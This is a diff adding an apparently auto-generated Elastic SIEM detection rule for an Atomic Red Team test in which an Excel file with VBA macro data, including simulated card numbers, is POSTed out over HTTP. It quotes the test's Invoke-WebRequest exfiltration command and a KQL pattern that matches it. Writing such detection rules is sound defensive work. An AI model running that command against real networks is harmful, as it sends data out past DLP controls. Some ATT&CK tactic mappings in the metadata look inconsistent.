@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'DLP Evasion via Sensitive Data in VBA Macro over HTTP' (GUID: e2d85e66-cb66-4ed7-93b1-833fc56c9319) of technique T1027 (Obfuscated Files or Information). Test Description: Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.. Command/Steps: Invoke-WebRequest -Uri #{ip_address} -Method POST -Body \\\"#{input_file}\\\"\n"
+from = "now-9m"
+rule_id = "73a70dd6-2aef-47ba-8d6d-d6566e333f0a"
+language = "kql"
+name = "Atomic Test: T1027 - DLP Evasion via Sensitive Data in VBA Macro over HTTP"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1027/T1027.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1027", "e2d85e66-cb66-4ed7-93b1-833fc56c9319", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*Invoke-WebRequest*\\\" AND powershell.script_block_text : \\\"*-Uri*\\\" AND powershell.script_block_text : \\\"*127.0.0.1*\\\" OR (process.command_line : \\\"*Invoke-WebRequest*\\\" AND process.command_line : \\\"*-Uri*\\\" AND process.command_line : \\\"*127.0.0.1*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1027"
+name = "DLP Evasion via Sensitive Data in VBA Macro over HTTP"
+reference = "https://attack.mitre.org/techniques/T1027"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1027"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1027"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1027"
+
+
